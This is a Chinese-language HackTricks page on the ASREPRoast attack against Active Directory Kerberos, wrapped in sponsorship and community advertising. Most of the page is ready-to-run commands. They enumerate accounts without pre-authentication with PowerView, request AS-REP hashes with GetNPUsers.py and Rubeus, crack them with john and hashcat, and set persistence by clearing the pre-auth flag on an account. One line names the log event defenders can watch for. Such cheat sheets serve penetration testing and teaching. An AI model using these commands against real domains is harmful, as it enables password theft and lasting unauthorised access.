# ASREPRoast

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**无需等待即可获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞经过验证后，您将获得奖励。

**在web3渗透测试中获得经验**\
区块链协议和智能合约是新的互联网！在其兴起的日子里掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声誉积分，并占据每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客攻击中获利！

{% embed url="https://hackenproof.com/register" %}

## ASREPRoast

ASREPRoast攻击寻找**不需要Kerberos预身份验证属性（[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**）**的用户。

这意味着任何人都可以代表这些用户向DC发送AS\_REQ请求，并接收AS\_REP消息。这种消息包含使用原始用户密钥（从其密码派生）加密的一段数据。然后，通过使用此消息，可以离线破解用户密码。

此外，**执行此攻击不需要域帐户**，只需要连接到DC。然而，**使用域帐户**可以使用LDAP查询来**检索域中不需要Kerberos预身份验证的用户**。**否则必须猜测用户名**。

#### 枚举易受攻击的用户（需要域凭据）
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
#### 请求AS_REP消息

{% code title="使用Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% code title="使用Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
使用Rubeus进行AS-REP Roasting将生成一个加密类型为0x17和预身份验证类型为0的4768。
{% endhint %}

### 破解
```
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### 持久性

对于具有**GenericAll**权限（或具有写入属性的权限）的用户，强制**preauth**不是必需的：
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
## 参考资料

[**有关使用 Rubeus 和 Hashcat 进行 AS-REP Roasting 的更多信息，请参考 ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof 是所有加密漏洞赏金的家园。**

**即刻获得奖励**\
HackenProof 的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在 web3 渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其兴起之时掌握 web3 安全。

**成为 web3 黑客传奇**\
每次验证的漏洞都会增加声誉点数，征服每周排行榜的顶端。

[**在 HackenProof 上注册**](https://hackenproof.com/register) 并从您的黑客攻击中获利！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在一家**网络安全公司**工作吗？您想在 HackTricks 中看到您的**公司广告**吗？或者您想获得**PEASS 的最新版本或下载 PDF 格式的 HackTricks**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或在 **Twitter** 上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享您的黑客技巧。**

</details>
